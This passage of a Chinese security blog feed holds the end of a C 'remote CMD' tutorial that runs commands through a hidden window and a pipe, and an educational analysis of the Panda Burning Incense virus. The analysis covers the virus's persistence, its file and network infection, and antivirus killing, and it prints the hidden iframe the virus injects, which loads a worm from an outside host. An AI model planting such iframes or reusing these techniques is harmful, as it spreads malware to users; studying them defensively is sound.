class="hljs-params">dwBufferSize</span>)</span>;<br><span class="hljs-built_in">int</span> main<span class="hljs-literal">()</span><br>&#123;<br><span class="hljs-comment">//执行的CMD命令</span><br><span class="hljs-built_in">char</span> pszCmd<span class="hljs-literal">[]</span> = <span class="hljs-string">&quot;ping www.baidu.com&quot;</span>;<br><span class="hljs-built_in">char</span> pszResultBuffer<span class="hljs-literal">[<span class="hljs-number">1024</span>]</span> = &#123; <span class="hljs-number">0</span> &#125;;<br>DWORD dwBufferSize = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-constructor">PipeCmd(<span class="hljs-params">pszCmd</span>, <span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>)</span><span class="hljs-operator"> == </span>TRUE)<br>&#123;<br>printf(<span class="hljs-string">&quot;执行成功:\n%s\n&quot;</span>,pszResultBuffer);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>printf(<span class="hljs-string">&quot;执行失败\n&quot;</span>);<br>&#125;<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br>return <span class="hljs-number">0</span>;<br>&#125;<br>BOOL <span class="hljs-constructor">PipeCmd(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszCmd</span>, <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszResultBuffer</span>, DWORD <span class="hljs-params">dwBufferSize</span>)</span><br>&#123;<br>HANDLE hReadPipe = NULL;<br>HANDLE hWritePipe = NULL;<br>SECURITY_ATTRIBUTES SEA = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL bRet = FALSE;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-comment">//设定管道的安全属性</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>bInheritHandle = TRUE;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>nLength = sizeof(SEA);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>lpSecurityDescriptor = NULL;<br><span class="hljs-comment">//创建匿名管道</span><br>bRet = <span class="hljs-constructor">CreatePipe(&amp;<span class="hljs-params">hReadPipe</span>, &amp;<span class="hljs-params">hWritePipe</span>, &amp;SEA, 0)</span>;<br><span class="hljs-keyword">if</span> (bRet<span class="hljs-operator"> == </span>FALSE)<br>&#123;<br>printf(<span class="hljs-string">&quot;创建管道失败\n&quot;</span>);<br>return bRet;<br>&#125;<br><span class="hljs-comment">//设置新进程的参数</span><br>si.cb = sizeof(si);<br>si.hStdError = hWritePipe;<br>si.hStdOutput = hWritePipe;<br>si.wShowWindow = SW_HIDE;<br>si.dwFlags = STARTF_USESHOWWINDOW <span class="hljs-pattern-match">| <span class="hljs-constructor">STARTF_USESTDHANDLES</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建新进程执行<span class="hljs-constructor">CMD</span>命令</span><br><span class="hljs-pattern-match">b<span class="hljs-constructor">Ret</span> = <span class="hljs-constructor">CreateProcess(NULL, <span class="hljs-params">pszCmd</span>, NULL, NULL, TRUE, 0, NULL, NULL, &amp;<span class="hljs-params">si</span>, &amp;<span class="hljs-params">pi</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-keyword">if</span> (b<span class="hljs-constructor">Ret</span> <span class="hljs-operator">==</span> <span class="hljs-constructor">FALSE</span>)</span><br><span class="hljs-pattern-match">&#123;</span><br><span class="hljs-pattern-match">printf(&quot;创建进失败\n&quot;);</span><br><span class="hljs-pattern-match">return b<span class="hljs-constructor">Ret</span>;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>等待执行结束</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">WaitForSingleObject(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>, INFINITE)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">WaitForSingleObject(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, INFINITE)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>从匿名管道中读取结果到输出缓冲区</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">RtlZeroMemory(<span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">ReadFile(<span class="hljs-params">hReadPipe</span>, <span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>, NULL, NULL)</span>;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>关闭句柄</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hWritePipe</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hReadPipe</span>)</span>;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">return b<span class="hljs-constructor">Ret</span>;</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>执行Ping baidu的命令，查看效果</p><p><img src="/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;远程CMD&quot;&gt;&lt;a href=&quot;#远程CMD&quot; class=&quot;headerlink&quot; title=&quot;远程CMD&quot;&gt;&lt;/a&gt;远程CMD&lt;/h2&gt;&lt;p&gt;CMD，提示进行命令输入的一种工作提示符，在windows系统下，相当于在windows窗口使用的DOS系统，简单来</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="功能技术" scheme="https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>熊猫烧香病毒分析</title>
    <link href="https://b1ackie.cn/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>https://b1ackie.cn/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</id>
    <published>2021-08-19T06:00:54.000Z</published>
    <updated>2021-08-26T04:43:57.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>熊猫烧香做为非常经典的病毒之一，可以说已经被分析烂了，网上也有许许多多的分析流程。作为病毒分析的一个初学者，我现在也尝试分析一下熊猫烧香，争取能够分析的比较清楚， 也能够学到一些东西。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>样本的基本信息</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1.png"></p><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>使用Process Monitor监控行为</p><p>可以看到panda.exe向C:\Windows\System32\drivers文件夹下释放了一个文件spcolsv.exe</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/2.png"></p><p>启动了spcolsv.exe这个进程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/3.png"></p><p>然后病毒的主体panda.exe将自身关闭</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/4.png"></p><p>spcolsv.exe进程中有大量的文件操作</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/5.png"></p><p>查看注册表的set操作，看到病毒在图中两个路径下设置了键值。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/6.png"></p><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run与自启动相关，病毒在其中设置键值，实现自启动。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/7.png"></p><p>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue这个键值主要是是否显示隐藏文件，当它为0时候，就是不显示隐藏的文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/8.png"></p><p>查看电脑上的文件时，会发现图标都被改成了熊猫烧香的图标。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/9.png"></p><p>现在大致清理一下思路，病毒主体为panda.exe，打开后，它会释放一个spcolsv.exe到C:\Windows\System32\drivers文件夹下，然后关闭自身，启动spcolsv.exe。spcolsv.exe有大量的文件操作，应该是和修改图标有关，同时还通过设置注册表键值，实现了自启动，和不显示隐藏的文件。</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>首先进入函数，是两个解密的函数，解密后进行比较，如果字符串不相等就会退出程序。那么可以看到，病毒的实际操作就是在比较之后的三个函数内，操作1,2,3，现在具体进入其中进行分析。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/11.png"></p><h3 id="操作1"><a href="#操作1" class="headerlink" title="操作1"></a>操作1</h3><p>在这里主要是病毒的主体程序的运行和被感染的EXE程序的运行。</p><h4 id="病毒主体panda-exe和spcolsv-exe流程"><a href="#病毒主体panda-exe和spcolsv-exe流程" class="headerlink" title="病毒主体panda.exe和spcolsv.exe流程"></a>病毒主体panda.exe和spcolsv.exe流程</h4><p>判断当前病毒运行的目录下是否存在一个Desktop.ini文件，如果存在会将其删除。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/12-1.png"></p><p>继续往下走，会判断当前的程序是否是C:\Windows\system32\drives\spcolsv.exe，如果不是还会判断当前是否存在这个进程spcolsv.exe，如果存在将其关闭。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/16.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/17.png"></p><p>然后将自身复制到C:\Windows\system32\drives\spcolsv.exe，运行spcolsv.exe，再退出当前进程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/18.png"></p><p>下面来看一下如果是被感染的EXE文件会有哪些操作。</p><h4 id="被感染的EXE文件"><a href="#被感染的EXE文件" class="headerlink" title="被感染的EXE文件"></a>被感染的EXE文件</h4><p>如果是一个被感染的EXE文件，那么在这里进行了文件结尾的读取，一个文件被感染的话，结尾会多出一段数据</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/15.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/13.png"></p><p>被感染文件结尾的标识</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/19.png"></p><p>如果此时是一个被感染的EXE文件，此时比较的结果如下图所示。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/14.png"></p><p>被感染文件，在这里会进行跳转，可以看到此时eax值是文件结尾标识的大小，结尾标识如上图，0x17=23。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/20.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/21.png"></p><p>之后会创建一个原文件名后面加上.exe的文件</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/22.png"></p><p>然后会在C:\Users\admin\AppData\Local\Temp下创建一个BAT文件，并且执行这个BAT文件，并且判断当前是否存在spcolsv.exe进程，存在的话将其关闭，然后会将病毒文件分离出来，复制到C:\Windows\system32\drives\spcolsv.exe，然后运行它，自身退出。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/23.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/25.png"></p><p>执行这个BAT文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/24.png"></p><p>查看bat文件的内容</p><figure class="highlight ceylon"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ceylon">:<span class="hljs-keyword">try</span><span class="hljs-number">1</span><br>del <span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span><br><span class="hljs-keyword">if</span> exist <span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span> goto <span class="hljs-keyword">try</span><span class="hljs-number">1</span><br>ren <span class="hljs-string">&quot;C:\1\aaa.exe.exe&quot;</span> <span class="hljs-string">&quot;aaa.exe&quot;</span><br><span class="hljs-keyword">if</span> exist <span class="hljs-string">&quot;C:\1\aaa.exe.exe&quot;</span> goto <span class="hljs-keyword">try</span><span class="hljs-number">2</span><br><span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span><br>:<span class="hljs-keyword">try</span><span class="hljs-number">2</span><br>del %<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>操作1到这里基本就结束了，panda.exe会将自身复制到驱动目录下，命名为spcolsv.exe，然后以spcolsv.exe继续运行。如果是被感染的exe文件，会先创建一个BAT文件，用于执行原程序，然后将病毒主体分离出来，继续运行。只要当前电脑上还存在一个被感染的exe文件，那么病毒就永远不会被清除。</p><h3 id="操作2"><a href="#操作2" class="headerlink" title="操作2"></a>操作2</h3><p>进入操作2，其中有三个函数，分开来看这三个函数。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/26.png"></p><h4 id="函数1，sub-40A7EC"><a href="#函数1，sub-40A7EC" class="headerlink" title="函数1，sub_40A7EC"></a>函数1，sub_40A7EC</h4><p>这里创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/27.png"></p><p>下断分析这里，这里获取了所有的磁盘，然后开始进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/28.png"></p><p>getDriveType（sub_4076B4)函数，遍历所有的盘符，从A到Z，然后保存起来，以便后续进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/29.png"></p><p>感染函数中，开始进行文件的搜索，搜索当前盘符下所有的文件，比如C盘，就是C:\*.*，关于文件搜索的一些内容可以查看这里<a href="https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/">文件遍历</a>。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/30.png"></p><p>如果是文件夹的话还要进行判断，排除了一些系统的目录，本身目录和上级目录”.”，”..”。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/31.png"></p><p>然后会判断当前目录中是否存在desktop.ini文件，如果不存在则会创建一个，向其中写入年月日。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/33.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/32.png"></p><p>存在的话就会判断其中的时间是否与当前时间相等，如果相等，则判断当前文件已经被感染就会跳过，如果不相等则继续感染，修改文件中的时间。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/34.png"></p><p>然后就是对于文件的操作，判断文件的类型执行相应的操作。如果是.GHO文件，也就是备份文件，就会将其删除。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/35.png"></p><p>获取文件的大小，如果文件大小超过0xA00000就不再继续感染，如果文件名字是setup.exe和NTDETECT.COM也不进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/36.png"></p><p>获取扩展名然后判断是否等于exe,scr,pid,com，如果是这几种文件类型就会执行40800C函数进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/37.png"></p><p>然后是网页类型文件是否是htm，html，asp，php，jsp，aspx，如果是这几种类型就会执行407ADC函数进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/38.png"></p><p>现在来着重看一下可执行文件与网页文件的感染方式。</p><h5 id="网页文件感染方式（sub-407ADC）"><a href="#网页文件感染方式（sub-407ADC）" class="headerlink" title="网页文件感染方式（sub_407ADC）"></a>网页文件感染方式（sub_407ADC）</h5><p>对于这类文件主要是在原文件的后面加上一个新的标签，其感染过程如下，它会读取文件内容，然后通过比较文件内容，看当前文件是否已经存在感染的标签判断其是否被感染过</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/39.png"></p><p>之后会进行感染，在文件的末尾加上一个iframe标签</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=http://www.krvkr.com/worm.htm <span class="hljs-attribute">width</span>=0 <span class="hljs-attribute">height</span>=0&gt;&lt;/iframe&gt;<br></code></pre></div></td></tr></table></figure><p>感染后的文件内容</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/40.png"></p><h5 id="可执行文件感染方式（sub-40800C）"><a href="#可执行文件感染方式（sub-40800C）" class="headerlink" title="可执行文件感染方式（sub_40800C）"></a>可执行文件感染方式（sub_40800C）</h5><p>首先是判断当前程序是否正在运行，如果正在运行的话，就不感染，然后读取文件内容，比对感染标志WhBoy判断是否已经被感染，如果已经被感染的话，就不再进行感染。感染过程是将病毒复制进被感染程序之中，修改图标，在末尾再加上一个感染标志。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/41.png"></p><p>感染标志</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/42.png"></p><p>感染前后文件大小对比</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E5%8E%9F%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E6%84%9F%E6%9F%93%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p><p>感染后的文件大小等于原文件大小加上病毒大小（60.5kb）。</p><h4 id="函数2，sub-40C5B0"><a href="#函数2，sub-40C5B0" class="headerlink" title="函数2，sub_40C5B0"></a>函数2，sub_40C5B0</h4><p>这个函数创建了一个定时器，每隔6S就执行一次。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/43.png"></p><p>首先还是获取了所有的磁盘。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/45.png"></p><p>然后是判断当前根目录下是否存在setup.exe这个文件，如果不存在将病毒主体复制过去并命名为setup.exe，如果存在的话又会读取spcolsv.exe和setup.exe的内容，判断是否相同，也就是判断setup.exe是不是病毒程序，如果不相等会将原setup.exe删除再重新复制一个。都满足的话继续后续的操作。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/44.png"></p><p>然后是对于autorun.inf的判断，也是先判断根目录下是否存在这个文件，如果不存在创建并写入内容，如果存在比对内容是否为病毒生成的内容，如果不是，则删除原始的，生成一个新的。流程与setup.exe基本上是一样的。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/46.png"></p><p>autorun.inf的内容</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/47.png"></p><p>最后会调用SetFileAttributesA函数将两个文件的属性设置为隐藏。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/48.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7%E9%9A%90%E8%97%8F.png"></p><h4 id="函数3，sub-40BD08"><a href="#函数3，sub-40BD08" class="headerlink" title="函数3，sub_40BD08"></a>函数3，sub_40BD08</h4><p>这个函数也是创建了一个线程，是循环创建了好几次，下断分析查看。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/49.png"></p><p>进来分析查看，其是创建了SOCKET通信，通过139和445端口感染局域网的共享文件夹。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/50.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/51.png"></p><p>这里我没有设置好环境，没有实现局域网感染，所以分析的可能不是很到位。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>操作2主要是创建了几个线程，sub_40A7EC是用来感染电脑盘符下的可执行文件和网页类型文件，还会在每个文件夹下创建一个desktop.ini写入当前感染的时间。sub_40C5B0每隔6S就会执行一次，遍历所有的盘符，判断盘符根目录下是否存在setup.exe（也就是病毒主体程序）和autorun.inf。sub_40BD08通过网络进行传播，可以看出来熊猫烧香的感染性，传播性确实很强。</p><h3 id="操作3"><a href="#操作3" class="headerlink" title="操作3"></a>操作3</h3><p>进来查看发现创建了四个定时器</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/52.png"></p><p>分开分析它们</p><h4 id="定时1，sub-40CD30函数"><a href="#定时1，sub-40CD30函数" class="headerlink" title="定时1，sub_40CD30函数"></a>定时1，sub_40CD30函数</h4><p>这个函数每一秒执行一次，进来后首先创建了一个线程，然后是两个对于注册表的操作，先分析一下创建的这个线程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/54.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/53.png"></p><h5 id="创建的线程"><a href="#创建的线程" class="headerlink" title="创建的线程"></a>创建的线程</h5><p>这个线程主要是病毒的一个自我保护，其中关闭了杀毒软件，</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/55.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/56.png"></p><p>还会检测关闭许多的进程，比如说无法打开任务管理器，注册表编辑器。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/57.png"></p><h5 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h5><p>针对注册表操作主要是两个，一个是在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中设置键值，实现自启动</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/58.png"></p><p>另一个是修改SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue键值，实现不显示隐藏文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/60.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/59.png"></p><h4 id="定时2，sub-40CE8C函数"><a href="#定时2，sub-40CE8C函数" class="headerlink" title="定时2，sub_40CE8C函数"></a>定时2，sub_40CE8C函数</h4><p>这个函数每1200S运行一次（20分钟）。</p><p>它首先创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/61.png"></p><p>分析此线程，发现其打开了一个URL并且尝试读取一些内容。</p><p><img 